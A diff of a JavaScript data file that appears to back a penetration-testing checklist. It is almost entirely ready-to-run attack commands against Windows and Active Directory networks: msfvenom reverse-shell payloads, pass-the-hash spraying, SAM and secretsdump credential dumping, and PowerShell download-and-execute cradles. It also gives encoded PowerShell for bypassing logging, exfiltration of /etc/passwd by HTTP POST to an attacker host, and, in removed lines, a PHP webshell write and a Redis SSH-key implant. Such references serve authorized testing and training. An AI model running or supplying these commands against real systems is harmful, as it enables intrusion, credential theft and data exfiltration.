+              "impacket-wmiexec <DOMAIN>/administrator@<TARGET_IP> -hashes 'LMHASH:NTHASH'"
             ]
           },
           {
-            "desc": "SSH Remote Port Forward",
-            "subdesc": "Expose local service to pivot",
+            "desc": "SMB PTH via smbclient",
+            "subdesc": "Access shares using NTLM hash instead of password",
             "cmd": [
-              "ssh -R <RPORT>:localhost:<LPORT> <USER>@<PIVOT>"
-            ]
-          },
-          {
-            "desc": "SSH Dynamic SOCKS Proxy",
-            "subdesc": "",
-            "cmd": [
-              "ssh -D 1080 <USER>@<PIVOT>",
-              "# Configure proxychains: socks5 127.0.0.1 1080",
-              "proxychains nmap -sT <INTERNAL_TARGET>"
-            ]
-          },
-          {
-            "desc": "Chisel",
-            "subdesc": "",
-            "cmd": [
-              "# Attacker:",
-              "chisel server -p 8080 --reverse",
-              "# Target:",
-              "chisel client <LHOST>:8080 R:<LPORT>:<TARGET>:<RPORT>"
-            ]
-          },
-          {
-            "desc": "Ligolo-ng",
-            "subdesc": "",
-            "cmd": [
-              "# Attacker:",
-              "ligolo-proxy -selfcert -laddr 0.0.0.0:11601",
-              "# Target:",
-              "ligolo-agent -connect <LHOST>:11601 -ignore-cert"
-            ]
-          }
-        ]
-      },
-      {
-        "id": "exploit-bloodhound",
-        "name": "Bloodhound",
-        "description": "neo4j setup, BloodHound-Python/SharpHound collection, and key AD attack path queries.",
-        "commands": [
-          {
-            "desc": "Start neo4j",
-            "subdesc": "Default creds: neo4j / neo4j",
-            "cmd": [
-              "sudo neo4j start"
-            ]
-          },
-          {
-            "desc": "BloodHound Python Collector (remote)",
-            "subdesc": "",
-            "cmd": [
-              "bloodhound-python -c All -u <USER> -p <PASS> -d <DOMAIN> -ns <DC_IP>"
-            ]
-          },
-          {
-            "desc": "SharpHound (.NET on target)",
-            "subdesc": "",
-            "cmd": [
-              ".\\SharpHound.exe -c All"
-            ]
-          },
-          {
-            "desc": "Import",
-            "subdesc": "",
-            "cmd": [
-              "# Open BloodHound GUI > Upload Data > select .zip"
-            ]
-          },
-          {
-            "desc": "Key Queries",
-            "subdesc": "",
-            "cmd": [
-              "# Find Shortest Paths to Domain Admins",
-              "# Find AS-REP Roastable Users",
-              "# Find Kerberoastable Users",
-              "# Shortest Path from Owned Principals"
-            ]
-          }
-        ]
-      },
-      {
-        "id": "exploit-metasploit",
-        "name": "Metasploit",
-        "description": "msfdb init, workspaces, module search, multi/handler, and Meterpreter basics.",
-        "commands": [
-          {
-            "desc": "Initialize",
-            "subdesc": "",
-            "cmd": [
-              "msfdb init",
-              "msfconsole -q"
-            ]
-          },
-          {
-            "desc": "Workspaces",
-            "subdesc": "",
-            "cmd": [
-              "workspace -a <NAME>",
-              "db_nmap -sV <TARGET_IP>"
-            ]
-          },
-          {
-            "desc": "Search & Use",
-            "subdesc": "",
-            "cmd": [
-              "search <TERM>",
-              "use <MODULE>",
-              "show options",
-              "set RHOSTS <TARGET_IP>",
-              "set LHOST <LHOST>",
-              "run"
-            ]
-          },
-          {
-            "desc": "Multi/Handler",
-            "subdesc": "",
-            "cmd": [
-              "use exploit/multi/handler",
-              "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-              "set LHOST 0.0.0.0",
-              "set LPORT <LPORT>",
-              "run"
-            ]
-          },
-          {
-            "desc": "Meterpreter Basics",
-            "subdesc": "",
-            "cmd": [
-              "sysinfo",
-              "getuid",
-              "hashdump",
-              "upload / download",
-              "shell",
-              "bg"
-            ]
-          }
-        ]
-      },
-      {
-        "id": "exploit-msfvenom",
-        "name": "msfvenom",
-        "description": "Windows/Linux/Web payloads in exe, elf, php, jsp, asp, war, and shellcode formats.",
-        "commands": [
-          {
-            "desc": "Windows x64 Staged",
-            "subdesc": "",
-            "cmd": [
-              "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe"
-            ]
-          },
-          {
-            "desc": "Windows x86 Stageless",
-            "subdesc": "",
-            "cmd": [
-              "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe"
-            ]
-          },
-          {
-            "desc": "Linux ELF",
-            "subdesc": "",
-            "cmd": [
-              "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf"
-            ]
-          },
-          {
-            "desc": "Web Payloads",
-            "subdesc": "",
-            "cmd": [
-              "msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -o shell.php",
-              "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -o shell.jsp",
-              "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f asp -o shell.asp"
-            ]
-          },
-          {
-            "desc": "Shellcode (Python)",
-            "subdesc": "",
-            "cmd": [
-              "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b \"\\x00\" EXITFUNC=thread -f python"
-            ]
-          },
-          {
-            "desc": "Common Formats",
-            "subdesc": "",
-            "cmd": [
-              "# exe, elf, dll, asp, aspx, jsp, war, php, py, ps1, hta, vba"
+              "smbclient //<TARGET_IP>/<SHARE> -U administrator --pw-nt-hash <NTHASH>"
             ]
           }
         ]
@@ -2883,21 +4125,21 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Check for Open Proxy",
-            "subdesc": "",
+            "subdesc": "If SQUID is open, you can pivot through it to reach internal services",
             "cmd": [
               "curl --proxy http://<TARGET_IP>:3128 http://127.0.0.1"
             ]
           },
           {
             "desc": "Scan Internal Ports through SQUID",
-            "subdesc": "",
+            "subdesc": "Install: git clone https://github.com/aancw/spose.git",
             "cmd": [
               "python3 spose.py --proxy http://<TARGET_IP>:3128 --target 127.0.0.1"
             ]
           },
           {
             "desc": "Configure Proxychains for SQUID",
-            "subdesc": "",
+            "subdesc": "Add the SQUID proxy to /etc/proxychains.conf then tunnel any tool through it",
             "cmd": [
               "# /etc/proxychains.conf: http <TARGET_IP> 3128",
               "proxychains nmap -sT 127.0.0.1"
@@ -2905,7 +4147,7 @@ const checklistPhases = [
           },
           {
             "desc": "Access Internal Services",
-            "subdesc": "",
+            "subdesc": "Try common internal ports: 80, 8080, 443, 8443, 8000, 3000, 9090",
             "cmd": [
               "curl --proxy http://<TARGET_IP>:3128 http://127.0.0.1:8080"
             ]
@@ -2919,14 +4161,14 @@ const checklistPhases = [
         "commands": [
           {
             "desc": "Repository",
-            "subdesc": "",
+            "subdesc": "Install: pip install ActiveDirectoryEnum",
             "cmd": [
               "https://github.com/CasperGN/ActiveDirectoryEnumeration"
             ]
           },
           {
             "desc": "Usage",
-            "subdesc": "",
+            "subdesc": "Run with --all for full enumeration or pick specific flags",
             "cmd": [
               "-h, --help            show this help message and exit",
               "--dc DC               Hostname of the Domain Controller",
@@ -2951,27 +4193,64 @@ const checklistPhases = [
       {
         "id": "exploit-adx",
         "name": "Active Directory Exploitation",
-        "description": "enum4linux-ng, CrackMapExec, impacket secretsdump/GetADUsers, and ldapdomaindump.",
+        "description": "enum4linux-ng, CrackMapExec (enumeration, spraying, PTH, SAM dump), impacket, and ldapdomaindump.",
         "commands": [
           {
             "desc": "enum4linux-ng",
-            "subdesc": "",
+            "subdesc": "Install: pip install enum4linux-ng. Next-gen enum4linux with JSON output",
             "cmd": [
               "enum4linux-ng -A <TARGET_IP>"
             ]
           },
           {
-            "desc": "CrackMapExec",
-            "subdesc": "",
+            "desc": "CrackMapExec: Enumerate Users",
+            "subdesc": "RID brute-force is more reliable than --users for finding all accounts",
             "cmd": [
-              "crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --users",
-              "crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --shares",
+              "crackmapexec smb <TARGET_IP> -u 'guest' -p '' --users",
+              "crackmapexec smb <TARGET_IP> -u guest -p '' --rid-brute"
+            ]
+          },
+          {
+            "desc": "CrackMapExec: Password Policy",
+            "subdesc": "Check lockout threshold before spraying to avoid account lockouts",
+            "cmd": [
+              "crackmapexec smb <TARGET_IP> -u '' -p '' --pass-pol"
+            ]
+          },
+          {
+            "desc": "CrackMapExec: Shares & Spider",
+            "subdesc": "List shares then spider for files matching a regex pattern",
+            "cmd": [
+              "crackmapexec smb <TARGET_IP> -u guest -p '' --shares",
+              "crackmapexec smb <TARGET_IP> -u guest -p '' --spider <SHARE> --regex .",
               "crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> -M spider_plus"
             ]
           },
           {
+            "desc": "CrackMapExec: Local Auth",
+            "subdesc": "Authenticate using a local account instead of domain credentials",
+            "cmd": [
+              "crackmapexec smb <TARGET_IP> -u 'Administrator' -p '<PASS>' --local-auth"
+            ]
+          },
+          {
+            "desc": "CrackMapExec: Pass The Hash",
+            "subdesc": "Spray an NTLM hash across a subnet to find reused local admin credentials",
+            "cmd": [
+              "crackmapexec smb <SUBNET>/24 -u administrator -H 'LMHASH:NTHASH' --local-auth",
+              "crackmapexec smb <SUBNET>/24 -u administrator -H 'NTHASH'"
+            ]
+          },
+          {
+            "desc": "CrackMapExec: Dump SAM",
+            "subdesc": "Extract local password hashes from the SAM database",
+            "cmd": [
+              "crackmapexec smb <TARGET_IP> -u '<USER>' -p '<PASS>' --local-auth --sam"
+            ]
+          },
+          {
             "desc": "impacket",
-            "subdesc": "",
+            "subdesc": "Install: pip install impacket. Swiss-army knife for AD — secretsdump, GetADUsers, etc.",
             "cmd": [
               "impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<TARGET_IP>",
               "impacket-GetADUsers <DOMAIN>/<USER>:<PASS> -dc-ip <TARGET_IP> -all"
@@ -2979,7 +4258,7 @@ const checklistPhases = [
           },
           {
             "desc": "ldapdomaindump",
-            "subdesc": "",
+            "subdesc": "Install: pip install ldapdomaindump. Dumps domain info to HTML/JSON/grep-friendly files",
             "cmd": [
               "ldapdomaindump -u <DOMAIN>\\\\<USER> -p <PASS> <TARGET_IP>"
             ]
@@ -2987,248 +4266,90 @@ const checklistPhases = [
         ]
       },
       {
-        "id": "exploit-2",
-        "name": "FTP Credential Attack (21)",
-        "description": "Brute force/default creds on FTP.",
+        "id": "exploit-filetransfer",
+        "name": "File Transfers",
+        "description": "Upload and exfiltrate files between attacker and target (Windows: certutil, PS, SMB; Linux: curl, SCP, /dev/tcp).",
         "commands": [
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "windows: xfreerdp3 Drive Share",
+            "subdesc": "Mount a local folder as a shared drive on the RDP session",
             "cmd": [
-              "hydra -L users.txt -P passwords.txt ftp://<TARGET_IP>",
-              "medusa -h <TARGET_IP> -u <USER> -P passwords.txt -M ftp"
+              "xfreerdp3 /v:<TARGET_IP> /u:<USER> /p:<PASS> /dynamic-resolution /drive:stuff,/tmp/stuff"
             ]
-          }
-        ]
-      },
-      {
-        "id": "exploit-3",
-        "name": "SSH Credential Attack (22)",
-        "description": "Password spray and valid credential validation.",
-        "commands": [
+          },
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "windows: certutil Download",
+            "subdesc": "Built-in Windows binary — often not flagged by basic AV",
             "cmd": [
-              "hydra -L users.txt -P rockyou.txt ssh://<TARGET_IP>",
-              "ssh <USER>@<TARGET_IP>"
+              "certutil -f -urlcache -split http://<LHOST>/<FILE> <OUTPUT>"
             ]
-          }
-        ]
-      },
-      {
-        "id": "exploit-4",
-        "name": "SMTP Relay / VRFY Abuse (25/465/587)",
-        "description": "Test relay misconfig and user enumeration.",
-        "commands": [
+          },
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "windows: PowerShell Download",
+            "subdesc": "Multiple methods — wget/IWR for file download, IEX for in-memory execution",
             "cmd": [
-              "swaks --to test@domain.local --from attacker@domain.local --server <TARGET_IP>",
-              "nmap --script smtp-open-relay,smtp-enum-users -p25,465,587 <TARGET_IP>"
+              "powershell -c 'wget -Uri http://<LHOST>/<FILE> -OutFile C:\\Windows\\Temp\\<FILE>'",
+              "powershell -c 'IWR -Uri http://<LHOST>/<FILE> -OutFile <PATH>'",
+              "powershell -c 'IEX (New-Object Net.WebClient).downloadString(\"http://<LHOST>/<FILE>\")'",
+              "powershell -c 'IEX(IWR http://<LHOST>/<FILE> -UseBasicParsing)'"
             ]
-          }
-        ]
-      },
-      {
-        "id": "exploit-6",
-        "name": "Windows: Kerberos AS-REP / Kerberoast (88)",
-        "description": "Domain credential extraction via Kerberos.",
-        "commands": [
+          },
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "windows: Encoded PowerShell",
+            "subdesc": "Base64-encode a PS command to bypass logging/restrictions",
             "cmd": [
-              "impacket-GetNPUsers <DOMAIN>/ -dc-ip <TARGET_IP> -usersfile users.txt -format hashcat",
-              "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <TARGET_IP> -request"
+              "echo -n '<powershell-command>' | iconv -f ASCII -t UTF-16LE | base64 | tr -d '\\n'",
+              "powershell.exe -nop -exec bypass -enc <ENCODED-OUTPUT>"
             ]
-          }
-        ]
-      },
-      {
-        "id": "exploit-5",
-        "name": "IMAP/POP Mailbox Brute (110/143/993/995)",
-        "description": "Mailbox auth attacks.",
-        "commands": [
+          },
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "windows: Exfiltrate via SMB",
+            "subdesc": "Set up authenticated SMB share on attacker, then copy files from target",
             "cmd": [
-              "hydra -L users.txt -P passwords.txt imap://<TARGET_IP>",
-              "hydra -L users.txt -P passwords.txt pop3://<TARGET_IP>"
+              "# Attacker:",
+              "impacket-smbserver share $(pwd) -smb2support -user hacker -password hacker123",
+              "# Target:",
+              "net use \\\\<LHOST>\\share /u:hacker hacker123",
+              "copy <FILE> \\\\<LHOST>\\share\\"
             ]
-          }
-        ]
-      },
-      {
-        "id": "exploit-7",
-        "name": "RPC/SMB Null Session & Share Abuse (135/139/445)",
-        "description": "Anonymous/domain share abuse paths.",
-        "commands": [
+          },
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "linux: Python HTTP Server + curl",
+            "subdesc": "Quickest method — host files, download with curl",
             "cmd": [
-              "rpcclient -U \"\" -N <TARGET_IP>",
-              "crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> --shares"
+              "python3 -m http.server 80",
+              "curl http://<LHOST>/<FILE> -o <FILE>"
             ]
-          }
-        ]
-      },
-      {
-        "id": "exploit-8",
-        "name": "SMB Remote Exec (445)",
-        "description": "Command execution through SMB with valid creds/hash.",
-        "commands": [
+          },
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "linux: SCP (requires SSH access)",
+            "subdesc": "Secure copy file to target over SSH — requires valid credentials",
             "cmd": [
-              "impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>",
-              "impacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET_IP>"
+              "scp <FILE> <USER>@<TARGET_IP>:/tmp"
             ]
-          }
-        ]
-      },
-      {
-        "id": "exploit-9",
-        "name": "Windows: LDAP Credentialed Abuse (389/636/3268/3269)",
-        "description": "Enumerate AD abuse paths with valid creds.",
-        "commands": [
+          },
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "linux: FTP Upload",
+            "subdesc": "Host a writable FTP server on pivot/attacker for file transfers",
             "cmd": [
-              "ldapsearch -x -H ldap://<TARGET_IP> -D \"<USER_DN>\" -w <PASS> -b \"dc=domain,dc=local\"",
-              "python3 bloodhound.py -c All -u <USER> -p <PASS> -d <DOMAIN> -ns <TARGET_IP>"
+              "python3 -m pyftpdlib -w -p 21",
+              "ftp <TARGET_IP>"
             ]
-          }
-        ]
-      },
-      {
-        "id": "exploit-14",
-        "name": "Oracle Account/SID Abuse (1521)",
-        "description": "Exploit weak Oracle credentials and misconfig.",
-        "commands": [
+          },
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "linux: /dev/tcp Transfer",
+            "subdesc": "No external tools needed — pure bash file transfer",
             "cmd": [
-              "odat passwordguesser -s <TARGET_IP> -d <SID>",
-              "odat all -s <TARGET_IP> -d <SID> -U <USER> -P <PASS>"
+              "# Sender: nc -lvnp 7777 < file",
+              "# Receiver: cat < /dev/tcp/<SENDER_IP>/7777 > file"
             ]
-          }
-        ]
-      },
-      {
-        "id": "exploit-11",
-        "name": "MSSQL Command Execution (1433)",
-        "description": "Leverage SQL Server to execute OS commands.",
-        "commands": [
+          },
           {
-            "desc": "",
-            "subdesc": "",
+            "desc": "linux: Exfiltrate via POST",
+            "subdesc": "Send files back to attacker HTTP listener",
             "cmd": [
-              "impacket-mssqlclient <USER>:<PASS>@<TARGET_IP>",
-              "EXEC sp_configure \"xp_cmdshell\",1;RECONFIGURE;EXEC xp_cmdshell \"whoami\";"
-            ]
-          }
-        ]
-      },
-      {
-        "id": "exploit-10",
-        "name": "NFS no_root_squash Abuse (2049)",
-        "description": "Exploit writable NFS exports for privesc foothold.",
-        "commands": [
-          {
-            "desc": "",
-            "subdesc": "",
-            "cmd": [
-              "mkdir /tmp/nfs",
-              "mount -t nfs <TARGET_IP>:/<SHARE> /tmp/nfs",
-              "cp /bin/bash /tmp/nfs/bash && chmod +s /tmp/nfs/bash"
-            ]
-          }
-        ]
-      },
-      {
-        "id": "exploit-12",
-        "name": "MySQL UDF / File Write Abuse (3306)",
-        "description": "Abuse FILE/UDF permissions on MySQL.",
-        "commands": [
-          {
-            "desc": "",
-            "subdesc": "",
-            "cmd": [
-              "mysql -h <TARGET_IP> -u <USER> -p",
-              "SELECT @@secure_file_priv;",
-              "SELECT \"<?php system($_GET[c]); ?>\" INTO OUTFILE \"/var/www/html/shell.php\";"
-            ]
-          }
-        ]
-      },
-      {
-        "id": "exploit-17",
-        "name": "RDP Password Spray (3389)",
-        "description": "Credential attack and desktop access validation.",
-        "commands": [
-          {
-            "desc": "",
-            "subdesc": "",
-            "cmd": [
-              "crowbar -b rdp -s <TARGET_IP>/32 -u <USER> -C passwords.txt",
-              "xfreerdp /u:<USER> /p:<PASS> /v:<TARGET_IP>"
-            ]
-          }
-        ]
-      },
-      {
-        "id": "exploit-13",
-        "name": "PostgreSQL Command Exec (5432)",
-        "description": "Use PostgreSQL feature abuse for command execution.",
-        "commands": [
-          {
-            "desc": "",
-            "subdesc": "",
-            "cmd": [
-              "psql -h <TARGET_IP> -U <USER>",
-              "COPY (SELECT \"bash -c 'id'\") TO PROGRAM \"bash\";"
-            ]
-          }
-        ]
-      },
-      {
-        "id": "exploit-15",
-        "name": "Redis Unauthorized Write (6379)",
-        "description": "Turn unauth Redis into persistence/RCE foothold.",
-        "commands": [
-          {
-            "desc": "",
-            "subdesc": "",
-            "cmd": [
-              "redis-cli -h <TARGET_IP>",
-              "CONFIG SET dir /root/.ssh",
-              "CONFIG SET dbfilename authorized_keys",
-              "SET crack \"<PUBKEY>\"",
-              "SAVE"
-            ]
-          }
-        ]
-      },
-      {
-        "id": "exploit-16",
-        "name": "MongoDB Unauth Data Access (27017)",
-        "description": "Exploit unauth MongoDB exposure.",
-        "commands": [
-          {
-            "desc": "",
-            "subdesc": "",
-            "cmd": [
-              "mongo --host <TARGET_IP> --port 27017",
-              "show dbs",
-              "use admin",
-              "show collections"
+              "wget --post-file=/etc/passwd <LHOST>",
+              "# Attacker: nc -lvp 80"
             ]
           }
         ]
@@ -3245,7 +4366,7 @@ const checklistPhases = [
       {
         "id": "active_directory_exploitation__no_creds",
         "name": "No Credentials",
-        "description": "",
+        "description": "Attack paths available without any credentials — network scanning, LLMNR/NBTNS poisoning, anonymous LDAP/SMB access, and Kerberos user enumeration.",
         "commands": [
           {
             "desc": "Scan network",
@@ -3262,7 +4383,7 @@ const checklistPhases = [
           },
           {
             "desc": "Find DC IP",
-            "subdesc": "",
+            "subdesc": "Identify Domain Controller IP via DNS SRV records or Kerberos port scan",
             "cmd": [
               "nmcli dev show <interface>",
               "nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>",
@@ -3271,14 +4392,14 @@ const checklistPhases = [
           },
           {
             "desc": "Zone transfer",
-            "subdesc": "",
+            "subdesc": "Attempt AXFR to dump all DNS records — often disabled but always worth trying",
             "cmd": [
               "dig axfr <domain_name> @<name_server>"
             ]
           },
           {
             "desc": "Anonymous & Guest access on SMB shares",
-            "subdesc": "",
+            "subdesc": "Test for unauthenticated SMB access — common misconfiguration in AD environments",
             "cmd": [
               "nxc smb <ip_range> -u '' -p",
               "nxc smb <ip_range> -u 'a' -p",
@@ -3336,7 +4457,7 @@ const checklistPhases = [
           },
           {
             "desc": "PXE",
-            "subdesc": "",
+            "subdesc": "Extract NAA credentials from PXE boot images — no domain creds required",
             "cmd": [
               "no password >>> Credentials (NAA account)",
               "pxethief.py 1",
@@ -3358,11 +4479,11 @@ const checklistPhases = [
       {
         "id": "active_directory_exploitation__valid_user",
         "name": "Valid User (No Password)",
-        "description": "",
+        "description": "Attacks possible with a valid username but no password — AS-REP Roasting, password spraying, and pre-auth enumeration.",
         "commands": [
           {
             "desc": "Password Spray",
-            "subdesc": "",
+            "subdesc": "ALWAYS check lockout policy first. Common patterns: Season+Year, Company+123",
             "cmd": [
               "Get password policy  (you need creds,but you should get the policy  first to avoid locking accounts)",
               "default policy",
@@ -3385,7 +4506,7 @@ const checklistPhases = [
           },
           {
             "desc": "ASREPRoast",
-            "subdesc": "",
+            "subdesc": "Target users with Kerberos pre-auth disabled — crack AS-REP hashes offline",
             "cmd": [
               "List ASREPRoastable Users (need creds)",
               "MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u",
@@ -3405,11 +4526,11 @@ const checklistPhases = [
       {
         "id": "active_directory_exploitation__authenticated",
         "name": "Valid Credentials",
-        "description": "",
+        "description": "Post-authentication enumeration and attack escalation with valid domain credentials — BloodHound collection, Kerberoasting, Share/GPO/ACL enumeration. Key pip installs: ldeep, man-spider, adidnsdump, coercer, sccmhunter, ad-miner.",
         "commands": [
           {
             "desc": "Classic Enumeration (users, shares, ACL, delegation, ...)",
-            "subdesc": "",
+            "subdesc": "Run BloodHound first to map attack paths, then enumerate shares, DNS, and LDAP",
             "cmd": [
               "Find all users >>> Username",
               "GetADUsers.py -all -dc-ip <dc_ip> <domain>/<username>",
@@ -3455,7 +4576,7 @@ const checklistPhases = [
           },
           {
             "desc": "Scan Auto",
-            "subdesc": "",
+            "subdesc": "Automated vulnerability scanning from BloodHound data — PingCastle for quick health check",
             "cmd": [
               "from BH result",
               "AD-miner -c -cf Report -u <neo4j_username> -p <neo4j_password>",
@@ -3474,7 +4595,7 @@ const checklistPhases = [
           },
           {
             "desc": "Coerce",
-            "subdesc": "",
+            "subdesc": "Force target to authenticate to your listener — combine with ntlmrelayx for relay attacks",
             "cmd": [
               "Drop file",
               ".lnk",
@@ -3503,7 +4624,7 @@ const checklistPhases = [
           },
           {
             "desc": "Intra ID Connect",
-            "subdesc": "",
+            "subdesc": "MSOL accounts often have DCSync privileges — high-value target",
             "cmd": [
               "Find MSOL",
               "nxc ldap <dc_ip> -u '<user>' -p '<password>' -M get-desc-users |grep -i MSOL"
@@ -3514,7 +4635,7 @@ const checklistPhases = [
       {
         "id": "active_directory_exploitation__low_hanging",
         "name": "Quick Compromise",
-        "description": "",
+        "description": "Low-effort high-impact wins — password reuse, Kerberoasting weak SPNs, GPP passwords, LAPS misconfigs, and default credentials.",
         "commands": [
           {
             "desc": "⚠️ Zerologon (unsafe) CVE-2020-1472 @CVE@",
@@ -3602,7 +4723,7 @@ const checklistPhases = [
           },
           {
             "desc": "Weak websites / services",
-            "subdesc": "",
+            "subdesc": "Scan for known web vulnerabilities with automated scanners",
             "cmd": [
               "nuclei",
               "nuclei -target <ip_range>",
@@ -3614,7 +4735,7 @@ const checklistPhases = [
       {
         "id": "active_directory_exploitation__know_vuln_auth",
         "name": "Known Vulns (Authenticated)",
-        "description": "",
+        "description": "Exploit known AD vulnerabilities with authenticated access — ZeroLogon, PrintNightmare, PetitPotam, noPac, and other CVEs.",
         "commands": [
           {
             "desc": "MS14-068",
@@ -3682,7 +4803,7 @@ const checklistPhases = [
       {
         "id": "active_directory_exploitation__acl",
         "name": "ACL / ACE Abuse",
-        "description": "",
+        "description": "Exploit misconfigured Access Control Lists — GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, and other dangerous ACEs.",
         "commands": [
           {
             "desc": "Dcsync",
@@ -3704,7 +4825,7 @@ const checklistPhases = [
           },
           {
             "desc": "On Group",
-            "subdesc": "",
+            "subdesc": "Add yourself to privileged groups via ACL abuse — check BloodHound for paths",
             "cmd": [
               "GenericAll/GenericWrite/Self/Add Extended Rights",
               "Add member to the group",
@@ -3717,7 +4838,7 @@ const checklistPhases = [
           },
           {
             "desc": "On Computer",
-            "subdesc": "",
+            "subdesc": "GenericAll/Write on computer = RBCD or Shadow Credentials attack",
             "cmd": [
               "GenericAll / GenericWrite",
               "msDs-AllowedToActOnBehalf >>> RBCD",
@@ -3726,7 +4847,7 @@ const checklistPhases = [
           },
           {
             "desc": "On User",
-            "subdesc": "",
+            "subdesc": "Change password, set SPN for Kerberoasting, or add shadow credentials",
             "cmd": [
               "GenericAll / GenericWrite",
               "Change password",
@@ -3741,7 +4862,7 @@ const checklistPhases = [
           },
           {
             "desc": "On OU",
-            "subdesc": "",
+            "subdesc": "WriteDACL on OU = ACE inheritance to all child objects",
             "cmd": [
               "Write Dacl",
               "ACE Inheritance",
@@ -3752,7 +4873,7 @@ const checklistPhases = [
           },
           {
             "desc": "ReadGMSAPassword",
-            "subdesc": "",
+            "subdesc": "gMSA accounts often have high privileges — extract their NTLM hash",
             "cmd": [
               "gMSADumper.py -u '<user>' -p '<password>' -d '<domain>",
               "nxc ldap <ip> -u <user> -p <pass> --gmsa",
@@ -3761,7 +4882,7 @@ const checklistPhases = [
           },
           {
             "desc": "Get LAPS passwords",
-            "subdesc": "",
+            "subdesc": "LAPS stores local admin passwords in AD — check who has read permissions",
             "cmd": [
               "Who can read LAPS",
               "MATCH p=(g:Base)-[:ReadLAPSPassword]->(c:Computer) RETURN p",
@@ -3775,7 +4896,7 @@ const checklistPhases = [
           },
           {
             "desc": "GPO",
-            "subdesc": "",
+            "subdesc": "GPO control = code execution on all linked OUs. Check who can create/edit GPOs",
             "cmd": [
               "Who can control GPOs",
               "MATCH p=((n:Base)-[]->(gp:GPO)) RETURN p",
@@ -3789,7 +4910,7 @@ const checklistPhases = [
           },
           {
             "desc": "DNS Admin",
-            "subdesc": "",
+            "subdesc": "DNSAdmins group can load arbitrary DLLs on the DC via serverlevelplugindll",
             "cmd": [
               "DNSadmins abuse (CVE-2021-40469) @CVE@ >>> Admin",
               "dnscmd.exe /config /serverlevelplugindll <\\\\path\\to\\dll> # need a dnsadmin user",
@@ -3801,11 +4922,11 @@ const checklistPhases = [
       {
         "id": "active_directory_exploitation__delegation",
         "name": "Kerberos Delegation",
-        "description": "",
+        "description": "Abuse unconstrained, constrained, and resource-based constrained delegation (RBCD) to impersonate high-privilege users.",
         "commands": [
           {
             "desc": "Find delegation",
-            "subdesc": "",
+            "subdesc": "Map all delegation types — unconstrained is highest priority (TGT theft)",
             "cmd": [
               "findDelegation.py \"<domain>\"/\"<user>\":\"<password>",
               "With BloodHound",
@@ -3832,7 +4953,7 @@ const checklistPhases = [
           },
           {
             "desc": "Constrained delegation",
-            "subdesc": "",
+            "subdesc": "Exploit S4U2Self/S4U2Proxy to impersonate privileged users for target services",
             "cmd": [
               "With protocol transition (any) UAC: TRUST_TO_AUTH_FOR_DELEGATION",
               "Get TGT for user",
@@ -3864,7 +4985,7 @@ const checklistPhases = [
           },
           {
             "desc": "Resource-Based Constrained Delegation",
-            "subdesc": "",
+            "subdesc": "Requires GenericWrite on target computer — create fake machine account then delegate",
             "cmd": [
               "add computer account",
               "addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <dc> -domain-netbios <domain_netbios> '<domain>/<user>:<password>",
@@ -3877,7 +4998,7 @@ const checklistPhases = [
           },
           {
             "desc": "S4U2self abuse",
-            "subdesc": "",
+            "subdesc": "Obtain service ticket as admin on a machine you already control",
             "cmd": [
               "Get machine account (X)'s TGT",
               "Get a ST on X as user admin",
@@ -3890,7 +5011,7 @@ const checklistPhases = [
       {
         "id": "active_directory_exploitation__adcs",
         "name": "ADCS",
-        "description": "",
+        "description": "Exploit Active Directory Certificate Services misconfigurations — ESC1-ESC8 template abuse, certificate theft, and NTLM relay to ADCS. Key tools: certipy (pip install certipy-ad), Certify.exe (from GhostPack).",
         "commands": [
           {
             "desc": "Enumeration",
@@ -3921,7 +5042,7 @@ const checklistPhases = [
           },
           {
             "desc": "Misconfigured Certificate Template",
-            "subdesc": "",
+            "subdesc": "ESC1-3, ESC13, ESC15 — request certs as other users via template misconfig",
             "cmd": [
               "ESC1 >>> Pass the certificate",
               "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>'  -ca <ca_name> -upn <target_user>@<domain>",
@@ -3943,7 +5064,7 @@ const checklistPhases = [
           },
           {
             "desc": "Misconfigured ACL",
-            "subdesc": "",
+            "subdesc": "ESC4 (template write) and ESC7 (CA officer) — modify templates to create ESC1 conditions",
             "cmd": [
               "ESC4",
               "write privilege over a certificate template",
@@ -3964,7 +5085,7 @@ const checklistPhases = [
           },
           {
             "desc": "Vulnerable PKI Object access control",
-            "subdesc": "",
+            "subdesc": "ESC5 — vulnerable ACLs on PKI objects. Golden certificate = forge any cert",
             "cmd": [
               "ESC5",
               "Vulnerable acl on PKI >>> ACL",
@@ -3975,7 +5096,7 @@ const checklistPhases = [
           },
           {
             "desc": "Misconfigured Certificate Authority",
-            "subdesc": "",
+            "subdesc": "ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2) and ESC11 (RPC relay to CA)",
             "cmd": [
